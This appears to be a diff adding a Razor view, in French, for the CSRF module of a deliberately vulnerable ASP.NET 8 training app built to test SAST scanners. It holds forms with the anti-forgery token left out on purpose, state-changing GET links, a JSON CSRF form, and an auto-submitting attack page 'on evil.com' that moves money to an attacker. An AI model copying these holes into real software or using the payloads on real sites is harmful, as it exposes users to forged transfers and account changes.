@@ -1,0 +1,359 @@
+﻿@using InsecureAppWebNet8.ViewModels
+@using InsecureAppWebNet8.Controllers
+@model VulnerabilityViewModel<CSRFResult>
+
+@{
+    ViewData["Title"] = "CSRF - Cross-Site Request Forgery";
+}
+
+<div class="container mt-4">
+    <!-- Avertissement de sécurité -->
+    <div class="alert alert-danger" role="alert">
+        <i class="fas fa-exclamation-triangle"></i>
+        <strong>DANGER :</strong> Ce module contient de vraies vulnérabilités CSRF détectables par les outils SAST.
+        Les endpoints n'ont pas de protection anti-CSRF et acceptent des requêtes cross-origin !
+    </div>
+
+    <h2>CSRF - Cross-Site Request Forgery</h2>
+    <p class="text-muted">Endpoints sans protection permettant des actions non autorisées depuis d'autres sites</p>
+
+    <!-- Contexte utilisateur -->
+    <div class="alert alert-info">
+        <i class="fas fa-user"></i> <strong>Contexte simulé :</strong>
+        Vous êtes connecté en tant que <strong>Alice</strong> | Solde : <strong>5000€</strong> | Email : <strong>alice@example.com</strong>
+    </div>
+
+    <!-- Formulaire principal -->
+    <form asp-controller="CSRF" asp-action="Index" method="post" class="mb-4">
+        <div class="row">
+            <div class="col-md-6">
+                <div class="form-group">
+                    <label for="attackType">Type d'attaque CSRF</label>
+                    <select id="attackType" name="attackType" class="form-control">
+                        <option value="">-- Sélectionnez un type --</option>
+                        @foreach (var attackInfo in Model.AttackInfos)
+                        {
+                            var selected = Model.AttackType == attackInfo.Key;
+                            <option value="@attackInfo.Key"
+                                    data-payload-example="@attackInfo.Value.PayloadExample"
+                                    data-risk-level="@attackInfo.Value.RiskLevel"
+                                    selected="@selected">
+                                @attackInfo.Key.ToUpper() - @attackInfo.Value.RiskLevel
+                            </option>
+                        }
+                    </select>
+                </div>
+
+                <!-- Exemple de payload -->
+                <div id="payloadExample" class="alert alert-secondary mt-2" style="display:none;">
+                    <strong>Exemple :</strong><br />
+                    <pre class="mb-0 mt-2" style="font-size: 0.85em;"><code id="payloadExampleContent"></code></pre>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+                <div class="form-group">
+                    <label for="payload">Endpoint / Action</label>
+                    <input type="text" id="payload" name="payload" class="form-control font-monospace"
+                           value="@Model.Payload" placeholder="/TransferMoney">
+                    <small class="form-text text-muted">
+                        L'endpoint sera automatiquement rempli selon votre sélection
+                    </small>
+                </div>
+
+                <button type="submit" class="btn btn-danger mt-3">
+                    <i class="fas fa-crosshairs"></i> Analyser la vulnérabilité CSRF
+                </button>
+            </div>
+        </div>
+    </form>
+
+    <!-- Description de l'attaque -->
+    @if (!string.IsNullOrEmpty(Model.AttackType) && Model.AttackInfos.ContainsKey(Model.AttackType))
+    {
+        var attackInfo = Model.AttackInfos[Model.AttackType];
+        var alertClass = attackInfo.RiskLevel.ToLower() switch
+        {
+            "critical" => "alert-danger",
+            "high" => "alert-danger",
+            "medium" => "alert-warning",
+            _ => "alert-info"
+        };
+
+        <div class="@alertClass mt-4">
+            <div class="d-flex align-items-start">
+                <div class="me-3">
+                    @if (attackInfo.RiskLevel == "Critical" || attackInfo.RiskLevel == "High")
+                    {
+                        <i class="fas fa-skull-crossbones text-danger fa-2x"></i>
+                    }
+                    else if (attackInfo.RiskLevel == "Medium")
+                    {
+                        <i class="fas fa-exclamation-triangle text-warning fa-2x"></i>
+                    }
+                    else
+                    {
+                        <i class="fas fa-info-circle text-info fa-2x"></i>
+                    }
+                </div>
+                <div class="flex-grow-1">
+                    <h5>@Model.AttackType.ToUpper() - @attackInfo.RiskLevel Risk</h5>
+                    <p class="mb-2">@attackInfo.Description</p>
+                    <div class="d-flex gap-2">
+                        <a href="@attackInfo.LearnMoreUrl" target="_blank" class="btn btn-sm btn-outline-primary">
+                            <i class="fas fa-external-link-alt"></i> En savoir plus
+                        </a>
+                        <span class="badge bg-@(attackInfo.RiskLevel.ToLower() == "critical" || attackInfo.RiskLevel.ToLower() == "high" ? "danger" : attackInfo.RiskLevel.ToLower() == "medium" ? "warning" : "info")">
+                            Risque : @attackInfo.RiskLevel
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    }
+
+    <!-- Résultats -->
+    @if (Model.Results?.Any() == true)
+    {
+        <div class="mt-4">
+            <div class="alert alert-info">
+                <h5><i class="fas fa-info-circle"></i> Instructions de test</h5>
+                <p>Testez ces vulnérabilités CSRF directement :</p>
+
+                @if (Model.AttackType == "no-token")
+                {
+                    <strong>Formulaire sans token CSRF :</strong>
+                    <br />
+                    <code>POST /CSRF/TransferMoney</code>
+                    <br />
+                    <div class="mt-3 p-3 border rounded">
+                        <h6>Formulaire vulnérable (sans token) :</h6>
+                        <form id="vulnerableForm" method="post" action="/CSRF/TransferMoney">
+                            <!-- PAS DE @Html.AntiForgeryToken() ! -->
+                            <div class="mb-2">
+                                <input type="text" name="toAccount" class="form-control" placeholder="Compte destinataire" value="bob">
+                            </div>
+                            <div class="mb-2">
+                                <input type="number" name="amount" class="form-control" placeholder="Montant" value="100">
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-money-bill-wave"></i> Transférer (sans CSRF token!)
+                            </button>
+                        </form>
+                    </div>
+                }
+                else if (Model.AttackType == "get-state-change")
+                {
+                    <strong>Modification d'état via GET :</strong>
+                    <br />
+                    <code>GET /CSRF/DeleteAccount?id=2</code>
+                    <br />
+                    <div class="mt-2">
+                        <a href="/CSRF/DeleteAccount?id=2" class="btn btn-danger btn-sm">
+                            <i class="fas fa-trash"></i> Supprimer le compte de Bob (GET!)
+                        </a>
+                        <a href="/CSRF/Subscribe?plan=premium&monthlyFee=99" class="btn btn-warning btn-sm">
+                            <i class="fas fa-credit-card"></i> Souscrire Premium 99€/mois (GET!)
+                        </a>
+                    </div>
+                    <div class="mt-2">
+                        <p><strong>Attaque via image :</strong></p>
+                        <code>&lt;img src="/CSRF/DeleteAccount?id=1" width="0" height="0"&gt;</code>
+                    </div>
+                }
+                else if (Model.AttackType == "cors-wildcard")
+                {
+                    <strong>API avec CORS mal configuré :</strong>
+                    <br />
+                    <code>POST /CSRF/ApiTransfer avec Origin: *</code>
+                    <br />
+                    <button class="btn btn-danger btn-sm test-cors-csrf">
+                        <i class="fas fa-globe"></i> Tester CSRF cross-origin
+                    </button>
+                }
+                else if (Model.AttackType == "no-samesite")
+                {
+                    <strong>Cookies sans SameSite :</strong>
+                    <br />
+                    <div class="alert alert-warning mt-2">
+                        <i class="fas fa-cookie-bite"></i> Les cookies de session sont envoyés même depuis des sites tiers !
+                        <br><small>Set-Cookie: session=abc123; HttpOnly (pas de SameSite!)</small>
+                    </div>
+                }
+                else if (Model.AttackType == "json-csrf")
+                {
+                    <strong>JSON CSRF (sans Content-Type strict) :</strong>
+                    <br />
+                    <code>POST /CSRF/UpdateProfileJson</code>
+                    <br />
+                    <form id="jsonCsrfForm" method="post" action="/CSRF/UpdateProfileJson" enctype="text/plain">
+                        <input name='{"username":"alice","email":"hacker@evil.com","phone":"666-666","address":"Hacked!","ignore":"' value='"}' type="hidden">
+                        <button type="submit" class="btn btn-danger btn-sm">
+                            <i class="fas fa-user-edit"></i> Modifier profil via form (JSON CSRF)
+                        </button>
+                    </form>
+                }
+
+                <div class="mt-3">
+                    <a href="/CSRF/AttackDemo" target="_blank" class="btn btn-warning btn-sm">
+                        <i class="fas fa-skull"></i> Page d'attaque CSRF
+                    </a>
+                    <a href="/CSRF/CheckStatus" target="_blank" class="btn btn-info btn-sm">
+                        <i class="fas fa-info-circle"></i> Vérifier l'état
+                    </a>
+                    <a href="/CSRF/TestEndpoints" target="_blank" class="btn btn-secondary btn-sm">
+                        <i class="fas fa-list"></i> Tous les endpoints
+                    </a>
+                </div>
+            </div>
+
+            <!-- Vulnérabilités détectables -->
+            <div class="alert alert-warning mt-3">
+                <h6><i class="fas fa-search"></i> Ce que les SAST vont détecter :</h6>
+                <ul class="mb-0">
+                    <li><strong>Missing [ValidateAntiForgeryToken]</strong> sur les actions POST</li>
+                    <li><strong>[IgnoreAntiforgeryToken]</strong> explicitement défini</li>
+                    <li><strong>State-changing GET requests</strong> (DELETE, UPDATE via GET)</li>
+                    <li><strong>CORS wildcard avec credentials</strong></li>
+                    <li><strong>Absence de @Html.AntiForgeryToken()</strong> dans les formulaires</li>
+                    <li><strong>Cookies sans SameSite</strong></li>
+                    <li><strong>Tokens CSRF prévisibles/statiques</strong></li>
+                </ul>
+            </div>
+        </div>
+    }
+
+    <!-- Exemples de code vulnérable -->
+    <div class="mt-4">
+        <div class="card border-secondary">
+            <div class="card-header bg-secondary text-white">
+                <h6><i class="fas fa-code"></i> Patterns détectables par SAST</h6>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>POST sans protection :</h6>
+                        <pre class="small"><code>[HttpPost]
+[IgnoreAntiforgeryToken] // VULNÉRABLE!
+public IActionResult TransferMoney(...)
+{
+    // Pas de vérification CSRF
+}</code></pre>
+
+                        <h6>GET modifiant l'état :</h6>
+                        <pre class="small"><code>[HttpGet] // VULNÉRABLE!
+public IActionResult DeleteAccount(int id)
+{
+    _accounts.Remove(id); // État modifié
+}</code></pre>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Formulaire sans token :</h6>
+                        <pre class="small"><code>&lt;form method="post"&gt;
+    @* PAS de @Html.AntiForgeryToken() ! *@
+    &lt;input name="amount" /&gt;
+    &lt;button&gt;Transférer&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+                        <h6>CORS mal configuré :</h6>
+                        <pre class="small"><code>Response.Headers.Add(
+    "Access-Control-Allow-Origin", "*"
+);
+Response.Headers.Add(
+    "Access-Control-Allow-Credentials", "true"
+);</code></pre>
+                    </div>
+                </div>
+
+                <div class="mt-3">
+                    <strong>Outils qui détecteront ces failles :</strong>
+                    <span class="badge bg-danger">Snyk</span>
+                    <span class="badge bg-warning text-dark">SonarQube</span>
+                    <span class="badge bg-info">Fortify</span>
+                    <span class="badge bg-success">Checkmarx</span>
+                    <span class="badge bg-secondary">Burp Suite</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Démo d'attaque CSRF -->
+    <div class="mt-4">
+        <div class="card border-danger">
+            <div class="card-header bg-danger text-white">
+                <h6><i class="fas fa-skull"></i> Simulation d'attaque CSRF</h6>
+            </div>
+            <div class="card-body">
+                <p>Un attaquant peut créer une page malveillante qui exécute des actions en votre nom :</p>
+                <pre><code>&lt;!-- Page sur evil.com --&gt;
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form method="POST" action="https://victim.com/CSRF/TransferMoney"&gt;
+        &lt;input name="toAccount" value="attacker" /&gt;
+        &lt;input name="amount" value="1000" /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                <small class="text-muted">La victime n'a qu'à visiter cette page pour que le transfert s'exécute!</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- État actuel -->
+    <div class="mt-4">
+        <h6><i class="fas fa-chart-line"></i> État actuel du compte</h6>
+        <div id="accountStatus" class="alert alert-light">
+            <div class="spinner-border spinner-border-sm" role="status">
+                <span class="visually-hidden">Chargement...</span>
+            </div>
+            Chargement de l'état...
+        </div>
+    </div>
+
+    <!-- Prévention (non implémentée) -->
+    <div class="mt-4">
+        <div class="card border-info">
+            <div class="card-header bg-info text-white">
+                <h6><i class="fas fa-shield-alt"></i> Prévention (NON implémentée ici)</h6>
+            </div>
+            <div class="card-body">
+                <p><strong>Note :</strong> Ces protections ne sont PAS implémentées pour permettre la détection SAST :</p>
+                <ul class="mb-0">
+                    <li><strong>[ValidateAntiForgeryToken]</strong> sur toutes les actions POST/PUT/DELETE</li>
+                    <li><strong>@Html.AntiForgeryToken()</strong> dans tous les formulaires</li>
+                    <li><strong>SameSite=Strict</strong> pour les cookies de session</li>
+                    <li><strong>Double Submit Cookie</strong> pattern pour les API</li>
+                    <li><strong>Vérification du header Referer/Origin</strong></li>
+                    <li><strong>CAPTCHA</strong> pour les opérations sensibles</li>
+                    <li><strong>Re-authentification</strong> pour les actions critiques</li>
+                    <li><strong>Tokens CSRF uniques par session</strong></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+@section Styles {
+    <link rel="stylesheet" href="~/css/csrf.css" asp-append-version="true" />
+}
+
+@section Scripts {
+    <!-- Données JSON sécurisées -->
+    <script type="application/json" id="attackInfosData">
+        @Html.Raw(System.Text.Json.JsonSerializer.Serialize(Model.AttackInfos, new System.Text.Json.JsonSerializerOptions { PropertyNamingPolicy = null }))
+    </script>
+
+    <!-- Données pour le JavaScript -->
+    <script>
+        window.csrfData = {
+            hasResults: @Json.Serialize(Model.Results?.Any() == true),
+            hasError: @Json.Serialize(!string.IsNullOrEmpty(Model.ErrorMessage)),
+            attackType: @Json.Serialize(Model.AttackType ?? ""),
+            payload: @Json.Serialize(Model.Payload ?? "")
+        };
+    </script>
+
+    <!-- Scripts externes -->
+    <script src="~/js/vulnerability-common.js"></script>
+    <script src="~/js/csrf.js"></script>
+}
